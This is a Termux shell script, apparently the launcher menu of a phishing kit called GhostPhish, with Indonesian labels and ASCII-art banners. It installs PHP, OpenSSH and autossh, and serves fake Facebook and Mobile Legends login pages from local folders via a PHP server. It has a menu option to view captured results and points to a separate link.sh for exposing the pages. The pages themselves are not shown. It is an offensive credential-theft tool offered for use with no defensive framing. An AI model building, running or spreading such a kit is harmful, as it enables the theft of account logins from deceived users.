clear
bi='\033[34;1m' #biru
i='\033[32;1m' #ijo
pur='\033[35;1m' #purple
cy='\033[36;1m' #cyan
me='\033[31;1m' #merah
pu='\033[37;1m' #putih
ku='\033[33;1m' #kuning

echo $pu""
figlet "Ghost"
figlet "                       Phising"
sleep 2
echo
echo "            __---__"
echo "         _-       /"
echo "        ( /     \ )"
echo "       (   O   O  )"
echo "      (      U     )"
echo "      (            )--"
echo "       (     O    )   \_    "
echo "       /                \__"
echo "    __/                    \__---->"
echo " __/                    \__      /"
echo "     ___/\              /_____--/"
echo
sleep 2
echo $i"AUTHOR :"
echo
echo $pur"   ©©   ©   © © ©"
echo "  © ©  ©   ©   ©"
echo " ©  © ©   ©   ©"
echo "©   ©©   © © ©"
echo ""
echo "                 ©©   ©   ©©        ©©   ©©   © © ©"
echo "                © ©  ©   ©  ©      © ©  ©  ©  ©___"
echo "               ©  © ©   ©____©    ©  © ©   ©  ©"
echo "              ©   ©©   ©      ©  ©   ©©    ©  © © ©"
echo $cy"==================================================="
sleep 2
echo
echo $cy"============================================="
echo $pur"| "$me"CARANYA :                                 "$pur"|"
echo $pur"| "$cy"[" $i"+" $cy"]" $i" PILIH LALU JALANKAN                "$pur"|"
echo $pur"| "$cy"[" $i"+" $cy"]" $i" BUKA TAB BARU/NEW SESSION          "$pur"|"
echo $pur"| "$cy"[" $i"+" $cy"]" $i" JALANKAN link.sh                   "$pur"|"
echo $pur"|"$cy"==========================================="$pur"|"
echo $pur"| "$cy"["$i"1"$cy"]"$i" INSTALL SEMUA BAHAN                   "$pur"|"
echo $pur"| "$cy"["$i"2"$cy"]"$i" FACEBOOK PHISING                      "$pur"|"
echo $pur"| "$cy"["$i"3"$cy"]"$i" MOBILE LEGENDS PHISING                "$pur"|"
echo $pur"| "$cy"["$i"4"$cy"]"$i" CEK HASIL                             "$pur"|"
echo $pur"| "$cy"["$i"5"$cy"]"$i" EXIT                                  "$pur"|"
echo $cy"============================================="

echo $cy"╭─["$ku"Pilih"$cy"]"
read -p"╰─>> " pil

if [ $pil = 1 ]
then
pkg update
pkg upgrade
apt-get install bash
apt install apache2
pkg install nano
pkg install python2
pkg install ruby toilet figlet
gem install lolcat
apt install openssh
apt install autossh
pkg install php
echo
echo $cy"PENGINSTALAN SELESAI..."
sleep 4
sh jalankan.sh
fi

if [ $pil = 2 ]
then
echo
echo
echo $me"MEMULAI..."
echo $i"_________________________________"
sleep 1
echo
echo $pur"  PHISING FACEBOOK LOGIN"
php -S localhost:8080 -t /data/data/com.termux/files/home/GhostPhish/FB
fi

if [ $pil = 3 ]
then
echo
echo
echo $me"MEMULAI..."
echo $i"_________________________________"
sleep 1
echo
echo $cy"  PHISING MOBILE LEGEND"
php -S localhost:8080 -t ~/GhostPhish/ML
fi

if [ $pil = 4 ]
then
cd ~/GhostPhish
sh lihat.sh
sleep 4
fi

if [ $pil = 5 ]
then
echo
echo $pu""
figlet "Thanks For Using This Tool"
echo
sleep 2
exit
fi
